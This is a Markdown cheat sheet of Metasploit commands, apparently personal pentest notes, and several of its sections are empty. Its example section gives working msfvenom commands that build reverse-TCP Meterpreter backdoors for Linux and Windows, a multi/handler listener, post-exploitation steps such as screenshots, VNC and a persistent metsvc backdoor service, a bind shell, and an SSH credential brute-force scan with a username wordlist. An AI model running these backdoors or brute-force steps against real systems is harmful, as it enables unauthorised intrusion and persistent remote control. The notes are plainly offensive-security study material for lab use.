# [metasploit framework](https://www.metasploit.com/)

## msfdb

```bash
kali:~ # msfdb init         # initialize db
kali:~ # msfdb reinit       # reinitialize db
kali:~ # msfdb delete       # delete db
kali:~ # msfdb start        # start db service
kali:~ # msfdb stop         # stop db service
kali:~ # msfdb status       # check db service status
kali:~ # msfdb run          # start db service

# deafult db is postgre
kali:~ # cat /usr/share/metasploit-framework/config/database.yml
```


---

## msfvenom

```bash
kali:~ # msfvenom -h
kali:~ # msfvenom -l payloads|format|archs
kali:~ # msfvenom -p <payload> LHOST=<kali ip> LPORT=<kali port> -f <format> -o <file>
# LHOST: local host, LPORT: local port
```


---

## msconsole

### basic

```bash
kali:~ # msfconsole

msf6 > help
msf6 > help <cmd>

msf6 > set <VAR> <var>      # set variable
msf6 > get <VAR> <var>      # get variable
msf6 > setg <VAR> <var>     # set global variable
msf6 > getg <VAR> <var>     # get global variable
```


---

### core command


---

### module command


---

### job command


---

### resource script command

```bash
kali:~ # cat >> <script> < EOF
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <kali ip>
set LPORT <kali port>
show options
EOF

# run script
kali:~ # msfconsole -q -r <script>

# command script
msf6 > resource <script>    # run command with file
msf6 > makerc <script>      # save command with file
```


---

### database backend command


---

## credentials backend command


---

## developer


---

## example

###  network topology

```
kali           target machine
192.168.0.10   192.168.0.20
   |              |
   |              |
   +--------------+...
```


### reverse_tcp / reverse_http / reverse_https / bind_tcp

```bash
# gen backdoor
kali:~ # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f elf -o backdoor    # for linux
kali:~ # msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f exe -o backdoor.exe  # for windows

kali:~ # msfconsole

msf6 > use exploit/multi/handler
msf6 > show options
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp    # for linux
msf6 > set PAYLOAD windows/meterpreter_reverse_tcp      # for windows
msf6 > set LHOST 192.168.0.10                           # local host / controller ip
msf6 > set LPORT 4444                                   # local port / controller port
msf6 > exploit                                          # wait target run backdoor

meterpreter > pwd
meterpreter > ls
meterpreter > screenshot
meterpreter > run vnc
meterpreter > run metsvc [-d | -h ]                      # backdoor serivce
meterpreter > quit

msf6 > quit

msf6 > use exploit/multi/handler
msf6 > set payload windows/metsvc_bind_tcp
msf6 > set lport 31337
msf6 > set rhost 192.168.0.20
msf6 > exploit
```


---

### ssh

```bash
msf6 > search ssh

msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 > show options
msf6 > set THREADS 3
msf6 > set RHOSTS 192.168.0.20
msf6 > run

msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > show options
msf6 > set THREADS 3
msf6 > set RHOSTS 192.168.0.20
msf6 > set STOP_ON_SUCCESS true
msf6 > set VERBOSE true
msf6 > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf6 > set USER_AS_PASS true
msf6 > run
```
